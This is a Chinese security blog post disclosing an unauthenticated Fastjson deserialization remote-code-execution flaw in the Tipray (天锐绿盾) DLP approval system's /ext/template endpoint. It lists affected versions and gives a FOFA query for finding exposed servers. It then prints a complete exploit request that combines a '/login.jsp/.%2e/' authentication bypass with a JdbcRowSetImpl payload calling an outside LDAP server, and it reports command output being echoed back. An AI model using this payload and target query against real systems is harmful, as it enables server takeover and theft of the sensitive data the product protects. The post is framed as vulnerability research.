---
title: "天锐绿盾审批系统 /ext/template fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-template-rce.html
asset_dir: assets/天锐绿盾审批系统-exttemplate-fastjson反序列化漏洞
---

# 天锐绿盾审批系统 /ext/template fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/29 08:20
* 352浏览
* [0评论](#comment)
* 9分钟阅读

深入探索

加密

延伸文件系统

信息安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

Linux 与 Unix

该系统的 `/ext/template` 接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的[反序列化](https://mrxn.net/tag/rce)缺陷，在未经授权的情况下，在服务器端[执行任意代码](https://mrxn.net/tag/rce)。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

深入探索

技术文章订阅

安全运维咨询

编程语言教程

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 漏洞修复方案

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 /ext/template fastjson反序列化漏洞](images/img-001-dccf215f282d.webp)](https://image.mrxn.net/ed147fe831ab47369e842b7ef295446a.webp)

1.2.7版本，不是最新版，是存在反序列化[rce](https://mrxn.net/tag/rce)漏洞的。

再看`/ext/template` 的实现部分

[![天锐绿盾审批系统 /ext/template fastjson反序列化漏洞](images/img-002-a5040b1544ee.webp)](https://image.mrxn.net/3ff90774102a49f8acb65a574433e40f.webp)

请求body被直接用于`JSONObject.parseObject`进行反序列化操作，非常明显的fastjson[反序列化](https://mrxn.net/tag/rce)漏洞没啥好分析的。

安全研究工具

深入探索

漏洞修复方案

云安全解决方案

安全工具开发

`/ext/template/{templateId}` 亦如此

[![天锐绿盾审批系统 /ext/template fastjson反序列化漏洞](images/img-003-e65af5e8a792.webp)](https://image.mrxn.net/100c19f6cdf248dfbe4856e57f696241.webp)

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

计算机服务器

[![天锐绿盾审批系统 /ext/template fastjson反序列化漏洞](images/img-004-fbee303a3771.webp)](https://image.mrxn.net/6effd7bdb52a4f1a8dc9fefa3d56b841.webp)

```
POST /trwfe/login.jsp/.%2e/rest/ext/template HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: dir
Content-Type: application/json

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://192.168.168.11:50389/165c51",
    "autoCommit": true
}
```

成功执行`dir`命令 并回显[命令执行](https://mrxn.net/tag/rce)结果

[![天锐绿盾审批系统 /ext/template fastjson反序列化漏洞](images/img-005-f3a27069c470.webp)](https://image.mrxn.net/e8659fa83a624e9e9d088ede97ca856f.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天锐绿盾审批系统 /ext/template fastjson反序列化漏洞](https://mrxn.net/jswz/trwfe-template-rce.html)  
文章链接：<https://mrxn.net/jswz/trwfe-template-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

防病毒程序与恶意软件

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-template-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞修复方案

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-template-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 